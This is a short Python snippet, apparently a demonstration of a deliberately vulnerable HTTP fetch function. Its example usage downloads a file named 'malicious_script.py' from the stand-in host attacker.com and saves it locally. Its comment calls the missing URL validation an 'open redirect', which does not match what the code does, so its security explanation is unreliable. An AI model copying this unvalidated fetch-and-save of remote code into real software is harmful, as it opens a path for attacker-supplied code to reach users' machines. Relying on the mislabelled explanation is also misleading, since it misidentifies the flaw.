import requests

def vulnerable_get(url):
    # No validation of the URL, allowing open redirects
    response = requests.get(url)
    return response.text

# Example usage
content = vulnerable_get("http://attacker.com/malicious_script.py")
with open("malicious_script.py", "w") as f:
    f.write(content)